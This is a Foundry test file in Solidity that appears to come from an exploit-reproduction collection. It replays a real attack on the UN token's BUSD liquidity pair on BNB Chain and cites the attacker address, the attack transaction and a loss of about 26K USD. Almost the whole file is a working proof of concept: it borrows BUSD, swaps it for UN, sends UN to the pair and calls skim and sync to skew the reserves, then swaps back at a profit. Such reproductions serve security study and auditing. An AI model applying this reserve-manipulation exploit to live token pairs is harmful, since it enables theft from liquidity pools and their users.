// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./UN.sol";
import "./AttackContract.sol";
import {BUSD} from "@utils/BUSD.sol";
import {USDCE} from "@utils/USDCE.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
// @KeyInfo - Total Lost : ~26K USD$
// Attacker - https://bscscan.com/address/0xf84efa8a9f7e68855cf17eaac9c2f97a9d131366
// Attack contract - https://bscscan.com/address/0x98e241bd3be918e0d927af81b430be00d86b04f9
// Attack Tx : https://bscscan.com/tx/0xff5515268d53df41d407036f547b206e288b226989da496fda367bfeb31c5b8b

// @Analysis - https://twitter.com/MetaTrustAlert/status/1667041877428932608

contract UNTestBase is Test {
    UN un;
    BUSD busd;
    AttackContract attackContract;
    address owner;
    address attacker;
    address busdAddr;
    UniswapV2Pair pair;
    uint112 reserve0pair = 84252468168797;
    uint112 reserve1pair = 105160077240219005280149210;
    uint32 blockTimestampLastpair = 1647888198;
    uint256 kLastpair = 0;
    uint256 price0CumulativeLastpair = 0;
    uint256 price1CumulativeLastpair = 0;
    uint256 balanceOfunpair = 3976072419420817555481090;

    function setUp() public {
        owner = address(this);
        busd = new BUSD();
        busdAddr = address(busd);
        un = new UN();
        pair = new UniswapV2Pair(
            address(busd),
            address(un),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        attackContract = new AttackContract();
        attacker = address(attackContract);
        // Initialize balances
        un.transfer(address(pair), balanceOfunpair);
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_named_decimal_uint(
            "BUSD balance before attack", busd.balanceOf(owner), busd.decimals()
            );
        emit log_named_decimal_uint(
            "UN balance before attack", un.balanceOf(owner), un.decimals()
            );
        emit log_named_decimal_uint(
            "Pair BUSD balance before attack", busd.balanceOf(address(pair)), busd.decimals()
            );
        emit log_named_decimal_uint(
            "Pair UN balance before attack", un.balanceOf(address(pair)), un.decimals()
            );
        emit log_named_decimal_uint(
            "Attacker BUSD balance before attack", busd.balanceOf(attacker), busd.decimals()
            );
        emit log_named_decimal_uint(
            "Attacker UN balance before attack", un.balanceOf(attacker), un.decimals()
            );
        emit log_string("");
    }

    modifier eurus() {
        _;
    }

    function borrow_busd_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        busd.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function swap_pair_attacker_busd_un(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        busd.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_un_busd(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        un.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }
    
    function burn_un_pair(uint256 amount) internal eurus {
        un.transfer(address(pair), amount);
        pair.skim(attacker);
        pair.sync();
    }

    function testExploit() public {
        printBalance("Step 0");
        vm.startPrank(attacker);
        uint256 amountIn = 100000e18;
        borrow_busd_owner(amountIn);
        printBalance("Step 1");
        (uint256 UNReserve, uint256 USDReserve,) = pair.getReserves();
        uint256 amountOut = (9970 * amountIn * UNReserve) / (10_000 * USDReserve + 9970 * amountIn);
        swap_pair_attacker_busd_un(
            busd.balanceOf(attacker), 
            amountOut
        );
        printBalance("Step 2");
        burn_un_pair(1e5);
        printBalance("Step 3");
        (UNReserve, USDReserve,) = pair.getReserves();
        amountIn = un.balanceOf(attacker);
        amountOut = (9970 * amountIn * USDReserve) / (10_000 * UNReserve + 9970 * amountIn);
        swap_pair_attacker_un_busd(amountIn, amountOut);
        printBalance("Step 4");
    }

}